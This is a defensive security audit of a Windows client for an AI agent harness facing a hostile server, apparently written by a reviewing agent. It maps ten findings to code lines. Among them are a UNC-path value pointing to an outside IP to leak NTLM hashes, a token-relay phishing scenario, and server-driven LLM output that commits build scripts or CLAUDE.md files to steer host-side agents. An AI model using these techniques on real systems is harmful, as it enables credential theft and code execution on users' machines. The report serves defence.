# Sicherheitsprüfung des Windows-Clients gegen einen feindlichen Server (10.11.2026)

> Historischer Bericht: Pfade, Programm- und Paketnamen beziehen sich auf den Stand vor der Umbenennung von „LLM Harness“ in **Hearth** (0.2.0), z. B. `crates/harness-cli` statt `crates/hearth-cli`.

Statische Prüfung des Stands `b406ad3` (v0.1.21) durch einen eigenen Agenten, nur lesend. Frage: Was kann jemand, der den harness-Server kontrolliert (kompromittiert, Mann in der Mitte bei `http://`, falscher DNS-Eintrag bei `harness login`), auf dem Rechner des Nutzers **außerhalb** der Sandbox auslösen? Die Prüfung vom 3.11. (`review-2026-11-03.md`) war breiter, hatte dieses Szenario aber nicht im Mittelpunkt. Ergebnis: 1 hoch, 3 mittel, 6 niedrig. Code direkt auf dem Host ausführen kann der Server nicht; der gefährlichste Weg führt über Autosync in den Projektordner.

## Stand der Behebung

Noch offen; die Entscheidung über die Funde, die das Verhalten ändern (1, 2, 7, 8), liegt beim Nutzer.

## Bericht des Prüfers

### 1. The server decides when agent work is merged into the checked-out branch (High)
- `tunnel.rs:731-734` (`autosync` comes from the server's prompt), `connect.rs:1826-1828`, `1987-1990` (the device obeys it), `connect.rs:796`, `949-990` (`session.takeover` runs for any offered project with no local consent), `takeover.rs:156-164` (only a High finding holds the merge).
- Scenario: the server sends `session.prompt {project: X, autosync: true}`; its LLM output makes pi commit a `build.rs`; when the reply ends autosync merges it into the checked-out branch if the host tree is clean. The next `cargo build`, or rust-analyzer in VS Code, runs it on the host.
- Medium only, hence merged: `build.rs`/`setup.py`/`conftest.py` (`review.rs:283-292`), `.vscode/settings.json` and tasks without `runOn` (`232-256`), CI files, `CLAUDE.md`/`AGENTS.md`/`.claude/commands|skills/` (`368-379`, lets the server instruct the user's host-side Claude Code). Not checked at all: Makefile/justfile, non-lifecycle `package.json` scripts, vite/eslint/jest configs, `bunfig.toml`, `rust-toolchain.toml`, `Directory.Build.props/targets`, gradle/maven wrapper properties, `.hta/.chm/.cpl/.xll/.docm` (only Low "binary").
- Reopens part of H2 (3.11.): the server also decides whether and when to merge.
- Fix: autosync as a local project setting (ignore the server's flag otherwise); a tray confirmation for takeovers the server triggers, or merge only into a separate branch; hold automatic merges on Medium findings too.

### 2. Every project is readable by the server without user action (Medium)
- `config/model.rs:216-240` (`[remote] enabled` defaults to true, also without a `[remote]` table), `connect.rs:899-913` (only "is it offered"), `connect.rs:1516-1535` (`confirm` only in `harness connect`, per conversation id the server controls), `sync/host.rs:241-265`, `sync/mod.rs:311-320` (every session start bundles `HEAD --branches --tags` into the container).
- Scenario: at night the server prompts each project; the VM starts and the agent reads every local branch and tag, including unpushed private ones, and returns them as tool output through the LLM pass-through, i.e. to the server.
- Fix: opt-in web-chat access or a one-time tray question per project; export only the checked-out branch.

### 3. The v0.1.21 device move can be relayed to steal the token (Medium)
- `server.rs:200-214`, `359-373` (HMAC over the nonce only, not bound to an address), `login.rs:29-33`, `155-206`, server `services/devices.ts:462-474` with `routes/devices.ts:91` (unauthenticated proof oracle).
- Scenario: the user runs `harness login https://<attacker-or-typo>` ("server moved" phish, hijacked DNS). The attacker forwards `{lookup, nonce}` to the real server's public `/api/pairing/prove` and returns the answer. The client stores the real token for the attacker's URL, sends it as bearer, deletes the old entry and restarts the background service against the attacker (autostart keeps it). Condition: the real server is reachable for the attacker (internet exposure since v0.1.20).
- Fix: HMAC over `nonce || PUBLIC_URL origin` and compare with the dialed URL; better ask the old address (authenticated with the token) for its new one; show old → new and ask; delete the old token only after the new server worked.

### 4. `apps.file` probes local files and leaks NTLM through UNC paths (Medium; Low on 3.11., still open)
- `app.rs:273-279` (`is_absolute` accepts `\\host\share\x`), `app_file.rs:77-101` (`metadata`/`open` immediately), `connect.rs:819-837` (path and OS error go back to the server).
- Scenario: `apps.file {path: "\\\\203.0.113.5\\s\\a"}` makes the background service connect to SMB as the user (NetNTLMv2 hash); `\\host@SSL@443\x` uses WebDAV. Local paths act as an existence oracle, sizes leak for zip/gz/ELF.
- Fix: accept only `Prefix::Disk` paths on local drives; touch the file only after local approval or answer with a generic error.

### 5. The app-file approval accepts documents (Low)
- `app_file.rs:142-147`: any zip passes, so `.docx`/`.xlsx`/`.pptx`/`.odt`/`.epub` and gzip/tar backups too (contradicts `:4-8`). The title is free server text with newlines in the approval dialog (`app.rs:267-270`, `menu.rs:477-499`). One "Yes" for "Rust-Toolchain" at `...\Steuer.docx` exfiltrates the document.
- Fix: reject OOXML/ODF content, require a matching extension, strip control characters from the title.

### 6. Server text reaches terminals unsanitized (Low)
- `login.rs:46-48, 99-104, 170-175` (user code, verification URL, user name, email, device name), `connect.rs:807, 827`, `app.rs:371-378, 428-436`, `review.rs:229, 247`. Allows OSC 8 links with fake text, window titles, possibly OSC 52 clipboard writes in Windows Terminal (uncertain).
- Fix: `sanitize()` on all server text.

### 7. The server's "always" answers persist in the project allow list (Low)
- `connect.rs:2121-2144` writes the allow list in `config.toml`; those hosts stay allowed for later terminal sessions, also after the server changed. `/_web/known` answering 204 auto-approves page fetches.
- Fix: from the server at most "once"/minutes/session; only tray or terminal may answer "always".

### 8. Server templates persist inside the sandbox (Low)
- Script templates plus `apps.set` (`template.rs:98-106`, `app.rs:476-569`) put server code into every instance PATH ahead of the image PATH; it can shadow `git`/`node`/`cargo` in the user's own `harness run`/`shell` and survives logout and re-pairing (`server-apps.json`, `[apps] enabled`).
- Fix: confirm new or changed templates locally; clear them on logout or a server change.

### 9. Session ids and the pairing URL are not validated (Low, partly uncertain)
- The session id reaches `ShellExecuteW("{server}/c/{session}")` (`menu.rs:349-351, 415`, `tray.rs:345-358`) and pi's arguments (`pi_rpc.rs:22-24`); `login.rs:368-391` hands the server's URL to `rundll32 url.dll,FileProtocolHandler` after a prefix check only.
- Fix: check ids with `valid_chat_id`; require the verification URL to have the server's origin.

### 10. Denial of service and information leaks (Low)
- No cap on sessions or files per prompt (`connect.rs:882-945`, `uploads.rs:105`): VM out of memory, a growing VHDX. `idleMinutes: 0` keeps the VM running; Jev can hold every merge. The device reports host project paths, uncommitted file names and branches (`connect.rs:1797-1808`). Plain `http://` is accepted without warning (`setup.rs:451` even suggests it); a LAN man in the middle is then the hostile server and gets the token.

### Checked and sound
- Token handling: ureq 3.4.2 never forwards auth headers on redirects; the tunnel follows no redirects; the token comes from the keyring only for the configured URL.
- Chat files: ids validated, downloads capped at 21 MiB, temp files named by index, names through `safe_name`, copy targets resolved inside the container.
- Templates: package names strictly validated; no `file`, no env, fixed hosts per kind; scripts only in the installer container.
- What the device accepts: route, takeover and `apps.set` check project and harness against the local list, read fresh; only known apps; config written via `toml_edit`.
- App-file approval only in the tray dialog (default Cancel) or a terminal; ids generated locally.
- Merge: hooks, fsmonitor and filters off, LFS smudge skipped, dirty tree refused, `merge-tree` dry run first; `merge --approve` pins the commit (the 3.11. Low is fixed); Jev only adds findings; OSV straight to api.osv.dev.
- `models.json` takes only whitelisted fields; the tray opens only the configured URL or the log and copies fixed strings; no server data reaches PowerShell, the registry, PATH, autostart or the VM service; `sanitize()` strips C0 and C1 control characters.

### Not reviewed
Whether pi or ConPTY pass escape sequences from model output to the user's terminal (OSC 52); how browsers handle odd URLs from ShellExecute/FileProtocolHandler; gateway parsing of server responses beyond a skim; the web app; anything at runtime.
